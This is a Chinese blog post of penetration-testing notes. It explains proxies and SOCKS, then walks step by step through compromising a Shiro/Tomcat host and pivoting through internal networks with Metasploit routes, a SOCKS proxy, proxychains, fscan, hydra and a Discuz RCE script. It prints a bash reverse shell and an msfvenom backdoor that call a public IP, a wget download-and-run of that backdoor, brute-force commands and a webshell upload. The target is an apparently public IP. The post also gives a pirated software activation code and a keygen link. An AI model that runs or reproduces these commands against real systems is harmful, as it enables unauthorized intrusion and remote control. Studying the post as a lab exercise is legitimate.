Proxy）：是一个位于客户端和原始服务器（origin server）之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标（原始服务器），然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须设置正向代理服务器，当然前提是要知道正向代理服务器的 IP 地址，还有代理程序的端口。</p><ul><li>隐藏访问者的行踪</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210153405.png" alt="image-20220921015328233"></p><ul><li>访问无法访问的服务器B</li></ul><p>比如我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到能够访问谷歌的代理服务器，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210153001.png" alt="image-20220921015342837"></p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>反向代理（Reverse Proxy）：正好与正向代理相反，对于客户端而言代理服务器就像是原始服务器，并且客户端不需要进行任何特别的设置。客户端向反向代理的命名空间中的内容发送普通请求，接着反向代理将判断向何处（原始服务器）转交请求，并将获得的内容返回给客户端。实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。</p><ul><li>保护和隐藏原始资源服务器</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210155093.png" alt="image-20220921015507026"></p><p>正向代理代理客户端，反向代理代理服务器。</p><h2 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h2><p>透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改变你的请求报文，并会传送真实IP。</p><p>透明代理实例，很多公司使用的行为管理软件</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210155801.png" alt="image-20220921015554604"></p><p>客户端 A 和客户端 B 并不知道行为管理设备充当透明代理行为，当用户 A 或用户 B向服务器 A 或服务器 B 提交请求的时候，透明代理设备根据自身策略拦截并修改用户 A 或 B 的报文，并作为实际的请求方，向服务器 A 或 B 发送请求，当接收信息回传，透明代理再根据自身的设置把允许的报文发回至用户 A 或 B，如上图，如果透明代理设置不允许访问服务器 B，那么用户 A 或者用户 B 就不会得到服务器 B 的数据。</p><blockquote><p>参考：<a href="https://laravelacademy.org/post/9336">https://laravelacademy.org/post/9336</a></p></blockquote><h2 id="什么是Socks"><a href="#什么是Socks" class="headerlink" title="什么是Socks"></a>什么是Socks</h2><p>SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。</p><p>根据OSI模型，SOCKS是会话层的协议，位于表示层与传输层之间。</p><p>使用TCP协议传输数据，因而不提供如传递 ICMP 信息之类的网络层网关服务。</p><p>注意是使用传输层TCP传输数据！！</p><blockquote><p>osi参考模型：<a href="https://www.cnblogs.com/qishui/p/5428938.html">https://www.cnblogs.com/qishui/p/5428938.html</a></p></blockquote><p>现今大多组织的网络架构，利用网络防火墙将组织内部的网络结构与外部网络如Internet 有效地隔离开来。这些防火墙系统通常以应用层网关的形式工作在网络之间，提供受控的 TELNET、FTP、SMTP等的接入。</p><p>而SOCKS则提供一个通用框架来使这些协议安全透明地穿过防火墙。</p><h2 id="什么是socks代理"><a href="#什么是socks代理" class="headerlink" title="什么是socks代理"></a>什么是socks代理</h2><p>1.被代理端与 代理服务器通过 SOCKS4&#x2F;5 代理协议进行通讯；</p><p>2.SOCKS4：是对HTTP代理协议的加强，它不仅代理HTTP协议，而是对所有向外的连接进行代理，没有协议限制；</p><p>3. SOCKS4a：SOCKS 4协议的简单扩展，允许客户端对无法解析域名的目的主机进行访问</p><p>4. SOCKS5：SOCKS5比SOCKS4a多了身份验证、IPv6、UDP支持。创建与SOCKS5服务器的TCP连接后客户端需要先发送请求来确认协议版本及认证方式</p><h2 id="我们为什么使用socks5代理"><a href="#我们为什么使用socks5代理" class="headerlink" title="我们为什么使用socks5代理"></a>我们为什么使用socks5代理</h2><blockquote><p><a href="https://xie.infoq.cn/article/5d83129a66afc11ffc3c92f12">https://xie.infoq.cn/article/5d83129a66afc11ffc3c92f12</a></p></blockquote><h2 id="使用Socks代理"><a href="#使用Socks代理" class="headerlink" title="使用Socks代理"></a>使用Socks代理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SOCKS服务器的IP地址</span><br><span class="line">SOCKS服务所在端口</span><br><span class="line">SOCKS服务是否需要身份验证</span><br></pre></td></tr></table></figure><h2 id="Socks代理与VPN区别"><a href="#Socks代理与VPN区别" class="headerlink" title="Socks代理与VPN区别"></a>Socks代理与VPN区别</h2><p>VPN主要用于从外网访问企业、公司的内部网络，原理是先登录到VPN防火墙、服务器，得到权限，在进入内网。这个过程，用户一直是以自己的身份进行的。而Socks5是一种代理，也就是先所有的交互数据都先经过另一台主机（网卡），这个过程中用户访问其他网络是都是使用的代理服务提供者的身份。</p><ul><li>张三在外出差想访问公司内网服务器</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210157332.png" alt="image-20220921015752169"></p><h2 id="Socks代理工具"><a href="#Socks代理工具" class="headerlink" title="Socks代理工具"></a>Socks代理工具</h2><h3 id="EarthWorm（用的少了，容易被杀，但很经典）"><a href="#EarthWorm（用的少了，容易被杀，但很经典）" class="headerlink" title="EarthWorm（用的少了，容易被杀，但很经典）"></a>EarthWorm（用的少了，容易被杀，但很经典）</h3><blockquote><p><a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p></blockquote><p>EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210158675.png" alt="image-20220921015814427"></p><h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><blockquote><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p></blockquote><p>frp 是一个可用于内网穿透的高性能的反向代理应用</p><h3 id="ProxyChains（linux代理软件、kali内置"><a href="#ProxyChains（linux代理软件、kali内置" class="headerlink" title="ProxyChains（linux代理软件、kali内置)"></a>ProxyChains（linux代理软件、kali内置)</h3><blockquote><p><a href="http://proxychains.sourceforge.net/">http://proxychains.sourceforge.net/</a></p></blockquote><p>关于ProxyChains工具：</p><ul><li>它是一个代理工具。</li><li>最新版本：3.1</li><li>专用OS：Linux和其他Unices。</li><li>允许TCP和DNS通过代理隧道。</li><li>支持HTTP、SOCKS4和SOCKS5代理服务器。</li><li>不同的代理类型可以混合在同一链中。</li><li>代理链：用户定义的代理链列表。</li></ul><p>可用性：</p><ul><li>通过代理服务器运行任何程序。</li><li>从限制性防火墙后面访问互联网。</li><li>隐藏你的IP</li><li>通过代理服务器运行SSH、telnet、wget、ftp、apt、vnc、nmap。</li><li>从外部通过反向代理访问内联网(192.168..&#x2F;10..)。</li></ul><h3 id="Proxifier（老师用的多）"><a href="#Proxifier（老师用的多）" class="headerlink" title="Proxifier（老师用的多）"></a>Proxifier（老师用的多）</h3><blockquote><ul><li><p><a href="https://www.proxifier.com/">https://www.proxifier.com/</a></p></li><li><p><a href="https://www.cnblogs.com/nul1/p/13952992.html">Proxifier使用教程 </a></p></li><li><p>激活</p></li></ul><blockquote><p>mac v3激活码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3CWNN-WYTP4-SD83W-ASDFR-84KEA</span><br></pre></td></tr></table></figure><p>windows 激活码生成工具：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Danz17/Proxifier-Keygen</span><br></pre></td></tr></table></figure></blockquote></blockquote><h3 id="Others"><a href="#Others" class="headerlink" title="-Others"></a>-Others</h3><blockquote><ul><li><p>reDuh：<a href="https://github.com/sensepost/reDuh">https://github.com/sensepost/reDuh</a></p></li><li><p>reGeorg（RGP）：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p></li><li><p>sSocks：<a href="https://sourceforge.net/projects/ssocks/">https://sourceforge.net/projects/ssocks/</a></p></li><li><p>SocksCap64（Windows）：<a href="http://www.sockscap64.com/">http://www.sockscap64.com</a></p></li></ul></blockquote><h1 id="Socks代理实战一-MSF"><a href="#Socks代理实战一-MSF" class="headerlink" title="Socks代理实战一(MSF)"></a>Socks代理实战一(MSF)</h1><p>使用已经msf搭建好的socks代理模块</p><p>注意msf使用socks5代理不稳定！</p><p>原理讲解：其他具体操作往下看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先我们的目标是proxychains curl http://192.168.2.242，访问192.168.2.242数据包，通过proxychains代理了这个请求！那我们代理服务器在哪呢？————在配置文件中配置的VPS ip+端口</span><br><span class="line">由于我是在VPS上的msf开启了socks5代理，所以ip填本地127.0.0.1，端口填1080</span><br><span class="line">也就是修改proxychains配置文件，设定其走的代理:</span><br><span class="line">        vim /etc/proxychains.conf</span><br><span class="line">        注释掉socks4那一行，加上：</span><br><span class="line">        socks5 127.0.0.1 1080</span><br><span class="line">2、数据通过proxychains走到了我们msf开启的socks5代理，那么socks5该怎么配置，才能让其访问到内网的主机呢！？这也是灵魂所在 socks5代理端 怎么配置</span><br><span class="line">数据包通过1080端口到了我们的msf socks 此时它该何去何从？</span><br><span class="line">需要先了解什么是路由：</span><br><span class="line">“路由是指路由器从一个接口上收到数据包，根据数据包的目的地址进行定向并转发到另一个接口的过程。”</span><br><span class="line">我们需要先配置msf的路由，这样子 数据包才会知道该往哪里转发</span><br><span class="line">3、msf路由怎么配置呢？</span><br><span class="line">可以在session2 我们拿到的目标内网第一台外网target1的meterpreter里面执行(当然了也可以在msf中执行添加路由的操作)：</span><br><span class="line">run autoroute -s 192.168.2.0/24    </span><br><span class="line">添加 192.168.2  网段的路由</span><br><span class="line">run autoroute -p    </span><br><span class="line">查看添加的路由</span><br><span class="line">Active Routing Table====================   </span><br><span class="line">Subnet             Netmask            Gateway   ------             -------            -------   </span><br><span class="line">192.168.2.0        255.255.255.0      Session 2</span><br><span class="line">默认的在这个路由表中，只会有10.30.1.255的路由，我们手动添加了192.168.2.0的路由（目标机器两个网卡）我们可以看到在子网192.168.2.0的数据会从网关session 2转发处理，这也是一系列的关键所在。</span><br><span class="line">将信息添加到路由后，数据到达msf socks服务器之后，查询路由表，就会知道往网关session 2转发数据包</span><br><span class="line">4、数据到达session 2后，也急速通过我们的shell meterpreter发送往target1。到了target1该如何走呢？</span><br><span class="line">通过target 1当作一个路由器，将我们的数据转发到target 2，原本上target 1与target 2就是通的。</span><br><span class="line">在物理层，会根据路由向对应mac地址的机器发送数据</span><br></pre></td></tr></table></figure><p>附：另一种run autoroute命令 添加msf路由方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看shell网络环境：</span><br><span class="line">meterpreter&gt;run get_local_subnets</span><br><span class="line">添加一条通向目标服务器内网的路由</span><br><span class="line">meterpreter&gt;run autoroute -s 100.0.0.0/8   #(根据目标内网网络而定)</span><br><span class="line">查看路由设置：</span><br><span class="line">meterpreter&gt;run autoroute –p</span><br><span class="line">一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以background返回msf&gt;，查看下外面的路由情况。</span><br><span class="line">route print</span><br><span class="line">如果发现没有路由信息，说明meterpreter shell设置的路由并没有生效，我们可以在msf中添加路由。</span><br><span class="line">msf&gt;route add 10.0.0.0 255.0.0.0 1</span><br><span class="line">说明：1表示session 1，攻击机如果要去访问10.0.0.0/8网段的资源，其下一跳是session1，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</span><br></pre></td></tr></table></figure><h2 id="渗透场景介绍"><a href="#渗透场景介绍" class="headerlink" title="渗透场景介绍"></a>渗透场景介绍</h2><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210200297.png" alt="image-20220921020045065"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先碰到一个网站 要去思考怎么入侵</p><p>收集到信息</p><p>从web类漏洞：xss、sql注入、文件上传、代码执行、逻辑漏洞、反序列化等等等</p><p>从中间件漏洞</p><p>从源码漏洞</p><p>从系统层漏洞</p><p>从数据库漏洞</p><p>从哪方面入手，要尝试，要积累经验，要思考</p><p>比如说 <a href="http://218.76.8.99:38080/">http://218.76.8.99:38080/</a>这台机器就是一个apache tomcat 8.5.0的版本，可以去搜索有没有历史漏洞</p><p>前提还是要收集够足够多的信息</p><h3 id="探测敏感目录"><a href="#探测敏感目录" class="headerlink" title="-探测敏感目录"></a>-探测敏感目录</h3><p>扫描后发现如下路径和文件可以访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://218.76.8.99:38080/</span><br><span class="line">---- Scanning URL: http://218.76.8.99:38080/ ----</span><br><span class="line">+ http://218.76.8.99:38080/docs (CODE:302|SIZE:0)</span><br><span class="line">+ http://218.76.8.99:38080/examples (CODE:302|SIZE:0)</span><br><span class="line">+ http://218.76.8.99:38080/favicon.ico (CODE:200|SIZE:21630)</span><br><span class="line">+ http://218.76.8.99:38080/host-manager (CODE:302|SIZE:0)</span><br><span class="line">+ http://218.76.8.99:38080/manager (CODE:302|SIZE:0)</span><br><span class="line">+ http://218.76.8.99:38080/sh (CODE:302|SIZE:0)</span><br></pre></td></tr></table></figure><h3 id="页面分析"><a href="#页面分析" class="headerlink" title="-页面分析"></a>-页面分析</h3><blockquote><p><a href="http://218.76.8.99:38080/sh/">http://218.76.8.99:38080/sh/</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210201431.png" alt="image-20220921020154228"></p><p>发现 apache shiro组件，得到默认页面，判断shiro是否能利用</p><p>并得到key： kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210202963.png" alt="image-20220921020205748"></p><blockquote><p><a href="https://github.com/fupinglee/ShiroScan/releases">https://github.com/fupinglee/ShiroScan/releases</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210202233.png" alt="image-20220921020231017"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210245769.png" alt="image-20220921020236023"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p><p>这个工具简便操作直接反弹shell好像有点问题，建议还是手动输入反弹shell的命令，后来试了，都可以拿到shell</p></blockquote><ul><li>执行命令</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210203954.png" alt="image-20220921020335774"></p><ul><li>反弹shell</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/124.223.217.243/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><ul><li>msfvenom 生成linux后门</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse\_tcp lhost=124.223.217.243 lport=6666 -f elf -o re\_1818.elf</span><br></pre></td></tr></table></figure><ul><li>MSF开启监听</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -p linux/x64/meterpreter/reverse\_tcp -H 124.223.217.243 -P 6666</span><br></pre></td></tr></table></figure><ul><li>远程下载执行上线MSF</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server wget -P /tmp &lt;http://124.223.217.243:8000/re_6666.elf&gt; chmod +x /tmp/re\_6666.elf ./re\_6666.elf sessions查看会话</span><br></pre></td></tr></table></figure><h2 id="渗透Target1"><a href="#渗透Target1" class="headerlink" title="渗透Target1"></a>渗透Target1</h2><ul><li>主机信息收集</li></ul><p>前面拿到了老师主机的shell，反弹回来的，然后拿到了meterpreter</p><p>ifconfig：发现存在 192.168.2.0&#x2F;24 的内网网段。inet模仿的就是机器公网ip，192.168.2.151模仿的就是我们拿到的内网ip，在2网段，据此我们继续收集信息，发起攻击</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210204872.png" alt="image-20220921020421699"></p><p>msf拿到的shell不好看，我们可以通过python美化一点，得到一个和本地执行一样更加真实的终端</p><p>python pty 模块得到 pty 终端</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -V 先查看是否有python</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>探测此网段存活主机：可以通过脚本，也可以通过fscan扫内网</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.sh</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 254);<span class="keyword">do</span> ping -c 1 192.168.81.<span class="variable">$num</span>|grep <span class="string">&quot;ttl&quot;</span>|awk -F <span class="string">&quot;[ :]&quot;</span> <span class="string">&#x27;&#123;print $4&#125;&#x27;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -P /tmp http://124.71.45.28:8000/1.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要使用fscan可能要先上传fscan，wget获取，msf 有upload功能        </span><br><span class="line">./fscan -h 192.168.2.0/24</span><br><span class="line">fscan扫内网很方便，扫描的快</span><br><span class="line"></span><br><span class="line">(icmp) Target &#x27;192.168.2.151&#x27; is alive</span><br><span class="line">(icmp) Target &#x27;192.168.2.1&#x27; is alive</span><br><span class="line">(icmp) Target &#x27;192.168.2.242&#x27; is alive</span><br><span class="line">192.168.2.242:445 open</span><br><span class="line">192.168.2.242:139 open</span><br><span class="line">192.168.2.242:135 open</span><br><span class="line">192.168.2.242:21 open</span><br><span class="line">192.168.2.242:80 open</span><br><span class="line"></span><br><span class="line">192.168.2.242:3306 open</span><br><span class="line"></span><br><span class="line">192.168.2.242:10000 open</span><br><span class="line">start vulscan</span><br><span class="line">NetInfo:</span><br><span class="line">[*]192.168.2.242</span><br><span class="line">   [-&gt;]metinfo-xss</span><br><span class="line">   [-&gt;]192.168.2.242</span><br><span class="line">   [-&gt;]192.168.3.190</span><br><span class="line"></span><br><span class="line">[*] 192.168.2.242        __MSBROWSE__\METINFO-XSS       Windows 7 Professional 7601 Service Pack 1</span><br><span class="line">[+] 192.168.2.242       MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[+] SSH:192.168.2.151:22:root root</span><br></pre></td></tr></table></figure><p>发现存活主机 192.168.2.242 ，并开放web服务，存在Discuz服务。</p><h2 id="渗透Target2"><a href="#渗透Target2" class="headerlink" title="渗透Target2"></a>渗透Target2</h2><h3 id="获得target1的shell后，添加到-192-168-2-网段的路由"><a href="#获得target1的shell后，添加到-192-168-2-网段的路由" class="headerlink" title="-获得target1的shell后，添加到 192.168.2 网段的路由"></a>-获得target1的shell后，添加到 192.168.2 网段的路由</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在目标target1上的meterpreter上执行</span><br><span class="line">run autoroute -s 192.168.2.0/24    添加到 192.168.2  网段的路由</span><br><span class="line">run autoroute -p    查看添加的路由</span><br></pre></td></tr></table></figure><h3 id="使用-MSF-的-socks5-模块建立-socks-代理服务（使用msf会很简单）"><a href="#使用-MSF-的-socks5-模块建立-socks-代理服务（使用msf会很简单）" class="headerlink" title="-使用 MSF 的 socks5 模块建立 socks 代理服务（使用msf会很简单）"></a>-使用 MSF 的 socks5 模块建立 socks 代理服务（使用msf会很简单）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search socks</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options    0.0.0.0表示任何人可上此代理，1080是连接socks代理的端口</span><br><span class="line">    SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be</span><br><span class="line">                                        an address on the local machine or 0.0.0.0 to listen on all add</span><br><span class="line">                                        resses.</span><br><span class="line">   SRVPORT   1080             yes       The port to listen on</span><br><span class="line"> </span><br><span class="line">exploit –j     后台执行</span><br><span class="line">jobs查看</span><br><span class="line"></span><br><span class="line">开启的socks代理流量，不管是本地的127.0.0.1还是外部我windows都可以走此通道</span><br><span class="line">msf搭建的就是一个socks代理服务器</span><br><span class="line">接下来通过proxychains验证socks代理是否有用</span><br><span class="line">我们可以通过netstat -anlp|grep 1080 查看1080端口状态 是否在监听</span><br></pre></td></tr></table></figure><h3 id="配置proxychains代理"><a href="#配置proxychains代理" class="headerlink" title="-配置proxychains代理"></a>-配置proxychains代理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VPS</span><br><span class="line">apt install proxychains</span><br><span class="line">修改配置 使我们的数据走我们代理</span><br><span class="line">vim /etc/proxychains.conf</span><br><span class="line">注释掉socks4那一行，加上：</span><br><span class="line">socks5 127.0.0.1 1080</span><br><span class="line">proxychains就是让我们执行的操作，走我们配置的代理服务器也就是本地的1080端口</span><br></pre></td></tr></table></figure><h3 id="检验测试"><a href="#检验测试" class="headerlink" title="-检验测试"></a>-检验测试</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">之前对内网信息收集 发现了192.168.2.242开启了http服务，进行测试</span><br><span class="line">proxychains curl http://192.168.2.242</span><br><span class="line">root@VM-16-6-ubuntu:~/tools# proxychains curl http://192.168.2.242</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="代理namp扫描内网"><a href="#代理namp扫描内网" class="headerlink" title="-代理namp扫描内网"></a>-代理namp扫描内网</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自此就可以通过proxchains代理访问内网的192.168.2.242机器，对其</span><br><span class="line">proxychains nmap -sT -Pn -n -T4 192.168.2.242</span><br><span class="line">另外需要注意一定要使用-Pn，不能使用ping，因为我们的socks是会话层协议，不支持ICMP协议，不支持ping</span><br><span class="line">开放端口：21/80/135/139/445/3306/3389</span><br><span class="line">操作系统：windows</span><br><span class="line">Nmap scan report for 192.168.2.242</span><br><span class="line">Host is up (0.026s latency).</span><br><span class="line">Not shown: 986 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">80/tcp    open  http</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">1025/tcp  open  NFS-or-IIS</span><br><span class="line">1026/tcp  open  LSA-or-nterm</span><br><span class="line">1027/tcp  open  IIS</span><br><span class="line">1031/tcp  open  iad2</span><br><span class="line">1047/tcp  open  neod1</span><br><span class="line">1049/tcp  open  td-postman</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="分析利用"><a href="#分析利用" class="headerlink" title="-分析利用"></a>-分析利用</h3><p>21 &#x2F; 3306 端口：弱口令爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains hydra -vV -l root -P /usr/share/wordlists/metasploit/password.lst 192.168.2.242 ftp</span><br><span class="line">proxychains hydra -vV -l root -P /usr/share/wordlists/metasploit/password.lst 192.168.2.242 mysql</span><br></pre></td></tr></table></figure><p>80端口：discuz（cnvd-2019-22239）</p><blockquote><p><a href="https://github.com/theLSA/discuz-ml-rce">https://github.com/theLSA/discuz-ml-rce</a>使用脚本快速getshell</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将脚本下载到本地</span><br><span class="line">pip install -r requirements.txt安装依赖</span><br><span class="line">proxychains python2 dz-ml-rce.py -u http://192.168.2.242/forum.php        检测是否可利用</span><br><span class="line">proxychains python2 dz-ml-rce.py -u http://192.168.2.242/forum.php --getshell        在网站根目录写入x.php</span><br><span class="line"></span><br><span class="line">执行结果</span><br><span class="line">root@VM-16-6-ubuntu:~/tools/discuz-ml-rce# proxychains python2 dz-ml-rce.py -u http://192.168.2.242/forum.php</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|DNS-request| ::1 </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response|: ::1 does not exist</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">target is vulnerable!!!</span><br><span class="line">root@VM-16-6-ubuntu:~/tools/discuz-ml-rce# proxychains python2 dz-ml-rce.py -u http://192.168.2.242/forum.php --getshell</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|DNS-request| ::1 </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response|: ::1 does not exist</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Getshell success!-shellPath:http://192.168.2.242/x.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="配置socks代理连接shell"><a href="#配置socks代理连接shell" class="headerlink" title="-配置socks代理连接shell"></a>-配置socks代理连接shell</h3><p>先配置socks代理，再连内网，记得保存生效</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210207597.png" alt="image-20220921020747432"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210207044.png" alt="image-20220921020755811"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210208307.png" alt="image-20220921020804093"></p><h2 id="渗透Target3"><a href="#渗透Target3" class="headerlink" title="渗透Target3"></a>渗透Target3</h2><p>我们如果需要拿到target3的shell需要先建立前往target3的路由，需要先拿到target2的meterpreter，当数据包到了之后，通过路由得知target 192.168.3.0网段的数据包要往target2的meterpreter session转发！</p><h3 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="-探测存活主机"></a>-探测存活主机</h3><p>ipconfig：发现存在 192.168.3.0&#x2F;24 的内网网段。</p><p>探测此网段存活主机：发现存活主机 192.168.3.180</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.3.0/24 &gt; 123.txt</span><br><span class="line"><span class="built_in">type</span> 123.txt</span><br><span class="line">+] 192.168.3.190    MS17-010    (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle:http://192.168.3.180:8983 code:302 len:0      title:None</span><br><span class="line">[*] WebTitle:http://192.168.3.180:8888 code:302 len:219    title:Redirecting...</span><br><span class="line">[*] WebTitle:http://192.168.3.180:888  code:403 len:548    title:403 Forbidden</span><br><span class="line">[*] WebTitle:http://192.168.3.180      code:302 len:0      title:None</span><br><span class="line">[*] 192.168.3.190        __MSBROWSE__\METINFO-XSS       Windows 7 Professional 7601 Service Pack 1</span><br><span class="line">[*] WebTitle:http://192.168.3.180:8983/solr/ code:200 len:14470  title:Solr Admin</span><br><span class="line">[*] WebTitle:http://192.168.3.180:8888/login code:200 len:24     title:安全入口校验失败</span><br><span class="line">[*] WebTitle:http://192.168.3.180/seller.php?s=/Public/login code:200 len:27     title:登录 - 商家管理系统</span><br><span class="line">[+] InfoScan:http://192.168.3.180:8888/login [宝塔-BT.cn] </span><br><span class="line">[*] WebTitle:http://192.168.3.190      code:200 len:23     title:-  Powered by Discuz!</span><br><span class="line">[+] http://192.168.3.180:8983 poc-yaml-solr-cve-2019-0193</span><br><span class="line">[+] http://192.168.3.190 poc-yaml-discuz-ml3x-cnvd-2019-22239</span><br><span class="line">[+] http://192.168.3.190 poc-yaml-phpstudy-backdoor-rce</span><br><span class="line">[+] SSH:192.168.3.180:22:root root</span><br></pre></td></tr></table></figure><h3 id="获取Target2的shell"><a href="#获取Target2的shell" class="headerlink" title="-获取Target2的shell"></a>-获取Target2的shell</h3><p>现在有两种思路拿到在内网种target2的shell，</p><p>其一是层层设置代理转发流量出网，最终到我们的VPS；其二便是接下来msf直接获取的方法</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210208921.png" alt="image-20220921020857687"></p><p>注意这个地方不能直接反弹shell，内网的target2并不能访问公网，所以不能通过reverse_tcp建立连接，不能反弹shell，反向的shell连接不到主机！</p><p>所以我们要使用正向shell 